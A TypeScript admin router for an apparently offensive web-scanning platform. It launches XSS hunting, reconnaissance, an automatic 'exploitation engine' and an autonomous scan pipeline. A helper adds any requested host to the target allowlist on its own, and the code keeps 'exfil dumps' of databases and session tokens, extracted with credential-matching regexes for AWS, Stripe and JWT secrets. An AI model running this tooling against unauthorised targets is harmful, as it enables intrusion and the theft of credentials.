            platforms: platformReport.tech_stack?.platforms || [],
            total_vulnerabilities: platformReport.total_vulnerabilities || 0,
            api_keys_found: (platformReport.api_keys_found || []).length,
            timestamp,
          },
        });
      } catch {}
    }

    if (!platformReport && events.length === 0) {
      return res.json({
        type: "PLATFORM_SCAN",
        timestamp,
        target,
        prefix: "[ALERT]",
        status: "ERROR",
        error: stderrOutput || "Platform scanner produced no output",
        events: [],
      });
    }

    const totalVulns = platformReport?.total_vulnerabilities || 0;
    const criticals = platformReport?.findings_count?.critical || 0;

    return res.json({
      type: "PLATFORM_SCAN",
      timestamp,
      target,
      prefix: criticals > 0 ? "[THREAT]" : totalVulns > 0 ? "[WARN]" : "[BLOCK]",
      status: criticals > 0 ? "CRITICAL" : totalVulns > 0 ? "VULNERABLE" : "PROTECTED",
      report: platformReport,
      events,
      tech_stack: platformReport?.tech_stack || {},
      vulnerabilities: platformReport?.vulnerabilities || [],
      api_keys_found: platformReport?.api_keys_found || [],
      findings_count: platformReport?.findings_count || {},
    });
  } catch (err: any) {
    return res.json({ type: "PLATFORM_SCAN", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});


adminRouter.post("/api/admin/sniper/selenium-xss", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[SELENIUM-XSS] Browser-based XSS hunt → ${target}`, "admin");

  try {
    const proc = spawn(PYTHON_BIN, ["scanner/run_selenium_xss.py", validation.url], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const events: any[] = [];
    let xssReport: any = null;

    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        events.push(event);
        if (event.type === "SELENIUM_XSS_REPORT" || event.event === "SELENIUM_XSS_REPORT") {
          xssReport = event;
        }
      } catch {}
    });

    let stderrOutput = "";
    proc.stderr?.on("data", (data: Buffer) => {
      stderrOutput += data.toString();
    });

    await new Promise<void>((resolve) => {
      proc.on("close", () => resolve());
      setTimeout(() => {
        proc.kill("SIGTERM");
        resolve();
      }, 180000);
    });

    const userId = (req.session as any)?.userId;
    if (xssReport) {
      try {
        await storage.createAuditLog({
          userId,
          action: "SNIPER:SELENIUM_XSS",
          target,
          ip: req.ip || "unknown",
          details: {
            xss_confirmed: xssReport.xss_confirmed || 0,
            dom_sinks: xssReport.dom_sinks || 0,
            csp_issues: xssReport.csp_issues || 0,
            total_findings: xssReport.total_findings || 0,
            timestamp,
          },
        });
      } catch {}
    }

    if (!xssReport && events.length === 0) {
      return res.json({
        type: "SELENIUM_XSS",
        timestamp,
        target,
        prefix: "[ALERT]",
        status: "ERROR",
        error: stderrOutput || "Selenium XSS Hunter produced no output",
        events: [],
      });
    }

    const confirmed = xssReport?.xss_confirmed || 0;
    const criticals = xssReport?.findings_count?.critical || 0;

    return res.json({
      type: "SELENIUM_XSS",
      timestamp,
      target,
      prefix: confirmed > 0 ? "[THREAT]" : criticals > 0 ? "[WARN]" : "[BLOCK]",
      status: confirmed > 0 ? `${confirmed} XSS CONFIRMED` : "NO XSS FOUND",
      report: xssReport,
      events,
      findings: xssReport?.findings || [],
      findings_count: xssReport?.findings_count || {},
    });
  } catch (err: any) {
    return res.json({ type: "SELENIUM_XSS", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});


adminRouter.post("/api/admin/sniper/autonomous-engine", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  log(`[MOTOR-11] Autonomous Consolidator Engine → ${target}`, "admin");

  try {
    const proc = spawn(PYTHON_BIN, ["-m", "scanner.autonomous_engine", validation.url], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const events: any[] = [];
    let motor11Report: any = null;

    const rl = readline.createInterface({ input: proc.stdout! });
    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        events.push(event);
        if (event.type === "MOTOR11" && event.event === "MOTOR11_FINAL_REPORT") {
          motor11Report = event.data;
        } else if (event.event === "motor11_report") {
          motor11Report = event.data;
        }
      } catch {}
    });

    let stderrOutput = "";
    proc.stderr?.on("data", (data: Buffer) => {
      stderrOutput += data.toString();
    });

    await new Promise<void>((resolve) => {
      proc.on("close", () => resolve());
      setTimeout(() => {
        proc.kill("SIGTERM");
        resolve();
      }, 180000);
    });

    const userId = (req.session as any)?.userId;
    if (motor11Report) {
      try {
        await storage.createAuditLog({
          userId,
          action: "SNIPER:MOTOR11_AUTONOMOUS",
          target,
          ip: req.ip || "unknown",
          details: {
            confirmed_vulns: motor11Report?.execution_summary?.confirmed_vulns || 0,
            total_tests: motor11Report?.execution_summary?.total_tests || 0,
            dictionary_total: motor11Report?.dictionary_total || 0,
            success_rate: motor11Report?.execution_summary?.success_rate || 0,
            timestamp,
          },
        });
      } catch {}
    }

    if (!motor11Report && events.length === 0) {
      return res.json({
        type: "MOTOR11_AUTONOMOUS",
        timestamp,
        target,
        prefix: "[ALERT]",
        status: "ERROR",
        error: stderrOutput || "Motor 11 produced no output",
        events: [],
      });
    }

    const confirmed = motor11Report?.execution_summary?.confirmed_vulns || 0;
    const totalTests = motor11Report?.execution_summary?.total_tests || 0;

    return res.json({
      type: "MOTOR11_AUTONOMOUS",
      timestamp,
      target,
      prefix: confirmed > 0 ? "[THREAT]" : totalTests > 0 ? "[WARN]" : "[BLOCK]",
      status: confirmed > 0 ? `${confirmed} VULNS CONFIRMED` : "AUTONOMOUS SCAN COMPLETE",
      report: motor11Report,
      events,
      reasoning: events.filter((e: any) => e.event === "motor11_reasoning" || e.event === "reasoning_log"),
      execution_summary: motor11Report?.execution_summary || {},
    });
  } catch (err: any) {
    return res.json({ type: "MOTOR11_AUTONOMOUS", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});


function addToAllowlist(target: string): string {
  const fullUrl = target.includes("://") ? target : `https://${target}`;
  const parsed = new URL(fullUrl);
  const hostname = parsed.hostname.toLowerCase();

  const allowlist = loadAllowlistStrict();

  const alreadyPresent = allowlist.allowed_targets.some((entry: string) => {
    try {
      const regex = new RegExp("^" + entry.replace(/\./g, "\\.").replace(/\*/g, ".*") + "$", "i");
      return regex.test(hostname);
    } catch { return false; }
  });

  if (!alreadyPresent) {
    const updated = {
      allowed_targets: [...allowlist.allowed_targets, hostname, `*.${hostname}`],
    };
    writeAllowlistStrict(updated);
  }

  return hostname;
}

// --- MOCK FILTERS FOR SNIPER PIPELINE RESULTS ---------------------------------
const GENERIC_SUBS = new Set([
  "api", "admin", "dev", "staging", "test", "beta",
  "ftp", "vpn", "cdn", "ci", "gitlab", "jira",
  "app", "ws", "socket", "status", "monitor"
]);
const GENERIC_SITEMAPS = [
  "/xml/sitemap.xml",
  "/xml/sitemap-imagens.xml",
  "/xml/sitemap-categorias.xml",
  "/xml/sitemap-landing-pages.xml",
  "/xml/sitemap-listas-de-compras.xml",
  "/xml/sitemap-paginas-institucionais.xml",
];

function sanitizeSniperState(state: any) {
  if (!state) return state;

  // 1) Subdomains: drop generic burst (>=10 all in template)
  const subFindings = (state.findings || []).filter((f: any) =>
    typeof f?.title === "string" && f.title.toLowerCase().startsWith("subdomain discovered")
  );
  const genericSubs = subFindings.filter((f: any) => {
    const name = String(f.title || "").split(":")[1]?.trim().split(".")[0]?.toLowerCase();
    return GENERIC_SUBS.has(name);
  });
  if (genericSubs.length >= 10 && genericSubs.length === subFindings.length) {
    state.findings = (state.findings || []).filter((f: any) => !subFindings.includes(f));
  }

  // 2) Ghost Recon clutter: drop HIGH/INFO entries without sensitive hints
  state.findings = (state.findings || []).filter((f: any) => {
    if (typeof f?.title === "string" && /ghost\s*recon/i.test(f.title)) {
      const blob = `${f.description || ""} ${f.evidence || ""}`.toLowerCase();
      const hasSensitive = /(key|token|secret|credential|login|admin|password|aws_|akia|bearer)/i.test(blob) || blob.includes("?");
      return hasSensitive;
    }
    return true;
  });

  // 3) Exposed assets: require evidence/validation; drop bulk .env wordlist spam
  const envLike = (a: any) =>
    typeof a?.path === "string" &&
    /(^|\/)\.?(env|git)(\.|\/|$)/i.test(a.path);
  const envAssets = (state.exposedAssets || []).filter(envLike);
  if (envAssets.length >= 5) {
    state.exposedAssets = (state.exposedAssets || []).filter((a: any) => !envLike(a));
  }

  // 4) Drop generic template endpoints (17 subs, sitemaps burst)
  state.exposedAssets = (state.exposedAssets || []).filter((a: any) => {
    const path = String(a?.path || "").toLowerCase();
    const host = path.replace(/^https?:\/\//, "").split("/")[0];
    if (GENERIC_SUBS.has(host)) return false;
    if (GENERIC_SITEMAPS.some(s => path.endsWith(s))) return false;
    return true;
  });

  // 5) Require evidence for high/critical findings (no evidence => drop)
  state.findings = (state.findings || []).filter((f: any) => {
    const sev = String(f?.severity || "").toLowerCase();
    if (sev === "high" || sev === "critical") {
      const evidence = f?.evidence || f?.proof || f?.confirmed || f?.sample || f?.artifacts;
      return !!evidence;
    }
    return true;
  });

  // 6) Clean events feed (mirror filters)
  state.events = (state.events || []).filter((ev: any) => {
    const et = ev?.event || "";
    const data = ev?.data || {};
    if (isMockSubdomainEvent(et, data) || isMockAssetEvent(data)) return false;
    return true;
  });

  // 4) Recompute counts after filters
  const counts = { total: 0, critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of state.findings || []) {
    counts.total++;
    const sev = String(f.severity || "").toLowerCase();
    if (sev === "critical") counts.critical++;
    else if (sev === "high") counts.high++;
    else if (sev === "medium") counts.medium++;
    else if (sev === "low") counts.low++;
    else counts.info++;
  }
  state.counts = counts;
  return state;
}
const activeSniperScans = new Map<string, {
  status: "running" | "completed" | "error";
  scanId: string;
  target: string;
  events: any[];
  findings: any[];
  exposedAssets: any[];
  telemetry: any;
  phases: any;
  counts: { total: number; critical: number; high: number; medium: number; low: number; info: number };
  startedAt: number;
  completedAt?: number;
  error?: string;
  sniperReport?: any;
  decisionIntelReport?: any;
  adversarialReport?: any;
  chainIntelReport?: any;
  hackerReasoningReport?: any;
}>();

adminRouter.post("/api/admin/sniper/full-recon", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  const userId = (req.session as any)?.userId;
  const io: any = (req.app as any).get("io");

  try {
    const hostname = addToAllowlist(target);
    log(`[SNIPER RECON] Allowlisted '${hostname}', launching full orchestrator → ${target}`, "admin");

    const scan = await storage.createScan({
      userId: userId || null,
      target: validation.url,
      consentIp: req.ip || "admin",
      consentAt: new Date(),
    });

    const scanState = {
      status: "running" as const,
      scanId: scan.id,
      target: validation.url,
      events: [] as any[],
      findings: [] as any[],
      exposedAssets: [] as any[],
      telemetry: {} as any,
      phases: {} as any,
      motor11Report: null as any,
      counts: { total: 0, critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      startedAt: Date.now(),
    };
    activeSniperScans.set(scan.id, scanState);

    await storage.createAuditLog({
      userId,
      action: "SNIPER:FULL_RECON_START",
      target: validation.url,
      ip: req.ip || "unknown",
      details: { scanId: scan.id, hostname, timestamp },
    });

    const proc = spawn(PYTHON_BIN, ["-m", "scanner.orchestrator", validation.url], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    const rl = readline.createInterface({ input: proc.stdout! });

    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        const eventType = event.event;
        const eventData = event.data;
        const eventKind = event.type || "";
        const state = activeSniperScans.get(scan.id);
        if (!state) return;

        // Drop mocks (subdomain template, sitemaps) from any event
        if (eventType === "finding_detected" || eventType === "asset_detected" || eventType === "log" || eventType === "block" || eventType === "alert") {
          if (isMockSubdomainEvent(eventType, eventData) || isMockAssetEvent(eventData)) {
            return;
          }
        }

        state.events.push({ event: eventType, data: eventData, timestamp: Date.now() });

        // Forward Motor11 realtime events to clients
        if (eventKind === "MOTOR11") {
          io?.emit(eventType, eventData);
        }

        if (eventType === "finding_detected" && eventData) {
          state.findings.push(eventData);
          const sev = (eventData.severity || "").toLowerCase();
          state.counts.total++;
          if (sev === "critical") state.counts.critical++;
          else if (sev === "high") state.counts.high++;
          else if (sev === "medium") state.counts.medium++;
          else if (sev === "low") state.counts.low++;
          else state.counts.info++;
        }

        if (eventType === "asset_detected" && eventData) {
          state.exposedAssets.push(eventData);
        }

        if (eventType === "telemetry_update" && eventData) {
          state.telemetry = { ...state.telemetry, ...eventData };
        }

        if (eventType === "phase_update" && eventData) {
          const phaseName = eventData.phase || eventData.name;
          if (phaseName) {
            state.phases[phaseName] = eventData;
          }
        }
      } catch {}
    });

    proc.stderr?.on("data", (data: Buffer) => {
      const msg = data.toString().trim();
      if (!msg || isChromeNoise(msg)) return;
      log(`[SNIPER RECON] stderr: ${msg}`, "admin");
    });

    proc.on("close", async (code: number | null) => {
      const state = activeSniperScans.get(scan.id);
      if (!state) return;

      state.status = code === 0 || code === null ? "completed" : "error";
      state.completedAt = Date.now();
      if (code !== 0 && code !== null) {
        state.error = `Orchestrator exited with code ${code}`;
      }

      log(`[SNIPER RECON] Orchestrator finished — ${state.counts.total} findings (${state.counts.critical}C/${state.counts.high}H)`, "admin");

      try {
        await storage.updateScan(scan.id, {
          status: state.status === "completed" ? "completed" : "error",
          findingsCount: state.counts.total,
          criticalCount: state.counts.critical,
          highCount: state.counts.high,
          mediumCount: state.counts.medium,
          lowCount: state.counts.low,
          infoCount: state.counts.info,
          findings: state.findings as any,
          exposedAssets: state.exposedAssets as any,
          telemetry: state.telemetry,
          phases: state.phases,
          completedAt: new Date(),
        });
      } catch (err: any) {
        log(`[SNIPER RECON] DB save error: ${err.message}`, "admin");
      }

      const critHighFindings = state.findings.filter((f: any) => {
        const sev = (f.severity || "").toLowerCase();
        return sev === "critical" || sev === "high";
      });

      if (critHighFindings.length > 0) {
        log(`[SNIPER RECON] ${critHighFindings.length} CRITICAL/HIGH findings — launching exploitation engine...`, "admin");

        try {
          const findingsFile = path.join(os.tmpdir(), `mse_recon_${scan.id}.json`);
          fs.writeFileSync(findingsFile, JSON.stringify(critHighFindings));

          const sniperProc = spawn(PYTHON_BIN, ["-m", "scanner.sniper_engine", validation.url, findingsFile], {
            cwd: BACKEND_ROOT,
            env: { ...process.env, PYTHONUNBUFFERED: "1" },
            stdio: ["pipe", "pipe", "pipe"],
          });

          const sniperRl = readline.createInterface({ input: sniperProc.stdout! });
          sniperRl.on("line", (line: string) => {
            try {
              const event = JSON.parse(line);
              state.events.push({ event: `sniper:${event.event}`, data: event.data, timestamp: Date.now() });
              if (event.event === "sniper_report") {
                state.sniperReport = event.data;
              }
            } catch {}
          });

          sniperProc.on("close", async () => {
            try { fs.unlinkSync(findingsFile); } catch {}

            if (state.sniperReport) {
              log(`[SNIPER RECON] Exploitation complete — ${state.sniperReport.vulnerabilities_confirmed}/${state.sniperReport.total_probes} confirmed`, "admin");
              await storage.createAuditLog({
                userId,
                action: "SNIPER:EXPLOITATION_COMPLETE",
                target: validation.url,
                ip: req.ip || "unknown",
                details: {
                  scanId: scan.id,
                  total_probes: state.sniperReport.total_probes,
                  vulnerabilities_confirmed: state.sniperReport.vulnerabilities_confirmed,
                  reconFindings: state.counts.total,
                  critHighFindings: critHighFindings.length,
                },
              });
            }
          });
        } catch (err: any) {
          log(`[SNIPER RECON] Exploitation launch error: ${err.message}`, "admin");
        }
      }

      await storage.createAuditLog({
        userId,
        action: "SNIPER:FULL_RECON_COMPLETE",
        target: validation.url,
        ip: req.ip || "unknown",
        details: {
          scanId: scan.id,
          findingsCount: state.counts.total,
          critical: state.counts.critical,
          high: state.counts.high,
          duration: state.completedAt - state.startedAt,
        },
      });

      setTimeout(() => activeSniperScans.delete(scan.id), 600000);
    });

    return res.json({
      scanId: scan.id,
      target: validation.url,
      status: "running",
      message: `Recon launched — target '${hostname}' allowlisted. Full orchestrator running.`,
    });
  } catch (err: any) {
    return res.status(500).json({ error: "Failed to launch recon: " + err.message });
  }
});

adminRouter.post("/api/admin/sniper/pipeline", async (req: Request, res: Response) => {
  const { target } = req.body;
  if (!target) return res.status(400).json({ error: "Target URL required" });

  const validation = validateSniperTarget(target);
  if (!validation.valid) return res.status(403).json({ error: validation.error });

  const timestamp = formatTimestamp();
  const userId = (req.session as any)?.userId;
  const io: any = (req.app as any).get("io");

  try {
    const hostname = addToAllowlist(target);
    log(`[SNIPER PIPELINE] Allowlisted '${hostname}', launching unified 5-phase pipeline → ${target}`, "admin");

    const scan = await storage.createScan({
      userId: userId || null,
      target: validation.url,
      consentIp: req.ip || "admin",
      consentAt: new Date(),
    });

    const scanState: any = {
      status: "running",
      scanId: scan.id,
      target: validation.url,
      events: [],
      findings: [],
      exposedAssets: [],
      telemetry: {},
      phases: {},
      counts: { total: 0, critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      startedAt: Date.now(),
      probes: [],
      pipelineReport: null,
      decisionIntelReport: null,
      adversarialReport: null,
      chainIntelReport: null,
      hackerReasoningReport: null,
      dbValidationReport: null,
      infraReport: null,
      sniperReport: null,
    };
    activeSniperScans.set(scan.id, scanState);

    await storage.createAuditLog({
      userId,
      action: "SNIPER:PIPELINE_START",
      target: validation.url,
      ip: req.ip || "unknown",
      details: { scanId: scan.id, hostname, timestamp, pipelineVersion: "3.0" },
    });

    const proc = spawn(PYTHON_BIN, ["-m", "scanner.sniper_pipeline", validation.url, scan.id], {
      cwd: BACKEND_ROOT,
      env: { ...process.env, PYTHONUNBUFFERED: "1" },
      stdio: ["pipe", "pipe", "pipe"],
    });

    proc.on("error", (err: any) => {
      const msg = `[SNIPER PIPELINE] spawn error: ${err?.message || err}`;
      log(msg, "admin");
      const state = activeSniperScans.get(scan.id);
      if (state) {
        state.status = "error";
        state.error = msg;
      }
    });

    const rl = readline.createInterface({ input: proc.stdout! });

    rl.on("line", (line: string) => {
      try {
        const event = JSON.parse(line);
        const eventType = event.event;
        const eventData = event.data;
        const state = activeSniperScans.get(scan.id);
        if (!state) return;

        state.events.push({ event: eventType, data: eventData, timestamp: Date.now() });

        if (eventType === "pipeline:finding_detected" && eventData) {
          state.findings.push(eventData);
          const sev = (eventData.severity || "").toLowerCase();
          state.counts.total++;
          if (sev === "critical") state.counts.critical++;
          else if (sev === "high") state.counts.high++;
          else if (sev === "medium") state.counts.medium++;
          else if (sev === "low") state.counts.low++;
          else state.counts.info++;
        }

        if (eventType === "pipeline:asset_detected" && eventData) {
          state.exposedAssets.push(eventData);
        }

        if (eventType === "pipeline:probe_result" && eventData) {
          state.probes = state.probes || [];
          state.probes.push(eventData);
        }

        if (eventType === "pipeline:phase_update" && eventData) {
          const phaseName = eventData.phase;
          if (phaseName) state.phases[phaseName] = eventData;
        }

        if (eventType === "pipeline:telemetry_update" && eventData) {
          state.telemetry = { ...state.telemetry, ...eventData };
        }

        if (eventType === "pipeline:pipeline_report" && eventData) {
          state.pipelineReport = eventData;
          state.sniperReport = eventData.sniper_report;
          state.decisionIntelReport = eventData.decision_intel_report;
          state.adversarialReport = eventData.adversarial_report;
          state.chainIntelReport = eventData.chain_intel_report;
          state.hackerReasoningReport = eventData.hacker_reasoning_report;
          state.dbValidationReport = eventData.db_validation_report;
          state.infraReport = eventData.infra_report;
        }

        if (eventType === "pipeline:decision_intel_report" && eventData) {
          state.decisionIntelReport = eventData;
        }

        if (eventType === "pipeline:adversarial_report" && eventData) {
          state.adversarialReport = eventData;
        }

        if (eventType === "pipeline:chain_intel_report" && eventData) {
          state.chainIntelReport = eventData;
        }

        if (eventType === "pipeline:hrd_report" && eventData) {
          state.hackerReasoningReport = eventData;
        }

        if (eventType === "pipeline:enterprise_dossier" && eventData) {
          (state as any).enterpriseDossier = eventData;
        }

        if (eventType === "log_stream" || eventType === "pipeline:log_stream") {
          // pass through for frontend polling
        }

        if ((eventType === "sniper_report" || eventType === "pipeline:sniper_report") && eventData) {
          state.sniperReport = eventData;
        }

        // Forward Motor11/autonomous telemetry to frontend (strip pipeline: prefix)
        const forwardEvents = [
          "motor11_report",
          "motor11v2",
          "motor11_execute_complete",
          "autonomous_thought",
          "motor11_reasoning",
          "reasoning_log",
          "probability_update",
          "monte_carlo",
        ];
        for (const fe of forwardEvents) {
          if (eventType === fe || eventType === `pipeline:${fe}`) {
            const emitType = fe;
            io?.emit(emitType, eventData);
          }
        }
      } catch {}
    });

    proc.stderr?.on("data", (data: Buffer) => {
      const msg = data.toString().trim();
      if (msg) log(`[SNIPER PIPELINE] stderr: ${msg}`, "admin");
    });

    proc.on("close", async (code: number | null) => {
      const state = activeSniperScans.get(scan.id);
      if (!state) return;

      state.status = code === 0 || code === null ? "completed" : "error";
      state.completedAt = Date.now();
      if (code !== 0 && code !== null) {
        state.error = `Pipeline exited with code ${code}`;
      }

      log(
        `[SNIPER PIPELINE] Finished — ${state.counts.total} findings ` +
        `(${state.counts.critical}C/${state.counts.high}H), ${(state.probes || []).length} probes`,
        "admin"
      );

      try {
        await storage.updateScan(scan.id, {
          status: state.status === "completed" ? "completed" : "error",
          findingsCount: state.counts.total,
          criticalCount: state.counts.critical,
          highCount: state.counts.high,
          mediumCount: state.counts.medium,
          lowCount: state.counts.low,
          infoCount: state.counts.info,
          findings: state.findings as any,
          exposedAssets: state.exposedAssets as any,
          telemetry: state.telemetry,
          phases: state.phases,
          completedAt: new Date(),
        });
      } catch (err: any) {
        log(`[SNIPER PIPELINE] DB save error: ${err.message}`, "admin");
      }

      // Motor 11 V2: snapshot completo -> decisão autônoma com dicionário
      try {
        sanitizeSniperState(state);

        const snapshotPath = writeMotor11Snapshot(validation.url, scan.id, state);
        const motor11v2 = await runMotor11Snapshot(snapshotPath);
        if (motor11v2.report) state.motor11v2Report = motor11v2.report;
        motor11v2.events.forEach((ev: any) => {
          state.events.push({ event: ev.event, data: ev.data, timestamp: Date.now() });
          io?.emit(ev.event === "motor11v2" ? "motor11v2" : ev.event, ev.data);
        });
        if (motor11v2.report) {
          await storage.createScanResult({
            scanId: scan.id,
            motor11v2Report: motor11v2.report,
          });
        }
      } catch (err: any) {
        log(`[MOTOR11V2] Error: ${err.message}`, "admin");
      }

      await storage.createAuditLog({
        userId,
        action: "SNIPER:PIPELINE_COMPLETE",
        target: validation.url,
        ip: req.ip || "unknown",
        details: {
          scanId: scan.id,
          findingsCount: state.counts.total,
          critical: state.counts.critical,
          high: state.counts.high,
          probes: (state.probes || []).length,
          vulnerableProbes: (state.probes || []).filter((p: any) => p.vulnerable).length,
          duration: state.completedAt - state.startedAt,
          pipelineVersion: "3.0",
        },
      });

      setTimeout(() => activeSniperScans.delete(scan.id), 600000);
    });

    return res.json({
      scanId: scan.id,
      target: validation.url,
      status: "running",
      pipeline: true,
      message: `Pipeline launched — 5 phases: INGEST → EXPLOIT → DB_VALIDATION → INFRA_SSRF → TELEMETRY. Target '${hostname}' allowlisted.`,
    });
  } catch (err: any) {
    return res.status(500).json({ error: "Failed to launch pipeline: " + err.message });
  }
});

adminRouter.get("/api/admin/sniper/scan/:id", async (req: Request, res: Response) => {
  const { id } = req.params;

  const liveState = activeSniperScans.get(id);
  if (liveState) {
    return res.json({
      scanId: id,
      status: liveState.status,
      target: liveState.target,
      counts: liveState.counts,
      findingsCount: liveState.findings.length,
      findings: liveState.findings,
      exposedAssets: liveState.exposedAssets,
      events: liveState.events.slice(-150),
      telemetry: liveState.telemetry,
      phases: liveState.phases,
      sniperReport: liveState.sniperReport || null,
      decisionIntelReport: liveState.decisionIntelReport || null,
      adversarialReport: liveState.adversarialReport || null,
      chainIntelReport: liveState.chainIntelReport || null,
      hackerReasoningReport: liveState.hackerReasoningReport || null,
      motor11v2Report: (liveState as any).motor11v2Report || null,
      probes: (liveState.probes || []).slice(-50),
      pipelineReport: liveState.pipelineReport || null,
      dbValidationReport: liveState.dbValidationReport || null,
      infraReport: liveState.infraReport || null,
      enterpriseDossier: (liveState as any).enterpriseDossier || null,
      duration: (liveState.completedAt || Date.now()) - liveState.startedAt,
      error: liveState.error,
    });
  }

  try {
    const scan = await storage.getScan(id);
    if (!scan) return res.status(404).json({ error: "Scan not found" });
    return res.json({
      scanId: scan.id,
      status: scan.status,
      target: scan.target,
      counts: {
        total: scan.findingsCount,
        critical: scan.criticalCount,
        high: scan.highCount,
        medium: scan.mediumCount,
        low: scan.lowCount,
        info: scan.infoCount,
      },
      findingsCount: scan.findingsCount,
      findings: scan.findings || [],
      exposedAssets: scan.exposedAssets || [],
      telemetry: scan.telemetry || {},
      phases: scan.phases || {},
      sniperReport: null,
      duration: scan.completedAt && scan.createdAt ? new Date(scan.completedAt).getTime() - new Date(scan.createdAt).getTime() : 0,
    });
  } catch (err: any) {
    return res.status(500).json({ error: "Failed to fetch scan" });
  }
});

adminRouter.get("/api/admin/sniper/latest-findings", async (req: Request, res: Response) => {
  const target = req.query.target as string;
  if (!target) return res.status(400).json({ error: "Target required" });

  try {
    const scans = await storage.getScansByTarget(target, 1);
    if (scans.length === 0) return res.json({ found: false, findings: [], counts: null });

    const latest = scans[0];
    return res.json({
      found: true,
      scanId: latest.id,
      status: latest.status,
      findings: latest.findings || [],
      counts: {
        total: latest.findingsCount,
        critical: latest.criticalCount,
        high: latest.highCount,
        medium: latest.mediumCount,
        low: latest.lowCount,
        info: latest.infoCount,
      },
      scannedAt: latest.completedAt || latest.createdAt,
    });
  } catch (err: any) {
    return res.status(500).json({ error: "Failed to fetch findings" });
  }
});

// Allow overriding dump directory (useful in Windows where Temp can be cleaned)
export const DUMPS_DIR = process.env.DUMPS_DIR || path.join(os.tmpdir(), "mse-dumps");
if (!fs.existsSync(DUMPS_DIR)) fs.mkdirSync(DUMPS_DIR, { recursive: true });
console.log(`[dumps] storing exfil dumps at: ${DUMPS_DIR}`);

interface DumpFile {
  id: string;
  category: "database" | "infra_secrets" | "config_files" | "session_tokens" | "idor_dumps" | "admin_exploits";
  filename: string;
  label: string;
  target: string;
  severity: "critical" | "high" | "medium" | "low";
  itemCount: number;
  sizeBytes: number;
  createdAt: string;
  scanId?: string;
  hasLiveFeedSecrets?: boolean;
  liveFeedKeys?: string[];
  extractionVector?: string;
}

const dumpRegistry: DumpFile[] = [];
const liveFeedSecretsStore: Map<string, string[]> = new Map();

const GENERIC_SUBDOMAIN_SET = new Set([
  "api",
  "admin",
  "dev",
  "staging",
  "test",
  "beta",
  "ftp",
  "vpn",
  "cdn",
  "ci",
  "gitlab",
  "jira",
  "app",
  "ws",
  "socket",
  "status",
  "monitor",
]);

const FEED_NOISE_REGEXES = [
  /\.template\./i,
  /subdomain.*discovered/i,
  /sitemap(\.xml)?/i,
  /generic-/i,
  /demo-/i,
  /test-/i,
  /acmecorp/i,
  /example\.com/i,
  /undefined:/i,
  /127\.0\.0\.1/i,
  /localhost/i,
];

function isMockSubdomainEvent(eventType: string, eventData: any) {
  if (!eventData) return false;

  const blob = `${eventType} ${eventData.title || ""} ${eventData.description || ""} ${eventData.message || ""}`.toString().toLowerCase();
  if (FEED_NOISE_REGEXES.some((r) => r.test(blob))) return true;

  // Direct domain/hostname field
  const domain = (eventData.domain || eventData.host || eventData.hostname || "").toString().toLowerCase();
  if (domain) {
    const label = domain.split(".")[0];
    if (GENERIC_SUBDOMAIN_SET.has(label)) return true;
  }

  // Message-based detection
  const msg = (eventData.message || "").toString().toLowerCase();
  if (msg.includes("subdomain discovered")) {
    for (const sub of GENERIC_SUBDOMAIN_SET) {
      if (msg.includes(`${sub}.`)) return true;
    }
  }

  // Enumeration summary with 17 items (pattern já conhecido)
  if (msg.includes("17 subdomain")) return true;

  return false;
}

function isMockAssetEvent(eventData: any) {
  const blob = `${eventData?.path || ""} ${eventData?.url || ""} ${eventData?.message || ""}`.toString().toLowerCase();
  if (FEED_NOISE_REGEXES.some((r) => r.test(blob))) return true;

  const pathish = (eventData?.path || eventData?.url || eventData?.message || eventData?.status || "").toString().toLowerCase();
  if (GENERIC_SITEMAPS.some(s => pathish.endsWith(s))) return true;
  const host = pathish.replace(/^https?:\/\//, "").split("/")[0];
  if (host) {
    const label = host.split(".")[0];
    if (GENERIC_SUBS.has(label)) return true;
  }
  return false;
}

function generateDumpId(): string {
  return `dump-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
}

export function writeDumpFile(filename: string, content: string): number {
  const filePath = path.join(DUMPS_DIR, filename);
  fs.writeFileSync(filePath, content, "utf-8");
  return Buffer.byteLength(content, "utf-8");
}

function extractRawSecrets(text: string): string[] {
  const patterns = [
    /([A-Z_]{2,})\s*[=:]\s*["']?([^\s"',}{]+)/g,
    /(mongodb\+srv?:\/\/[^\s"']+)/gi,
    /(postgres(?:ql)?:\/\/[^\s"']+)/gi,
    /(redis:\/\/[^\s"']+)/gi,
    /(sk_live_[a-zA-Z0-9]+)/g,
    /(AKIA[0-9A-Z]{16})/g,
    /(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)/g,
    /(SG\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)/g,
    /(whsec_[a-zA-Z0-9]+)/g,
    /(AIzaSy[a-zA-Z0-9_-]{33})/g,
  ];
  const found: string[] = [];
  for (const pat of patterns) {
    let m;
    while ((m = pat.exec(text)) !== null) {
      found.push(m[0]);
    }
  }
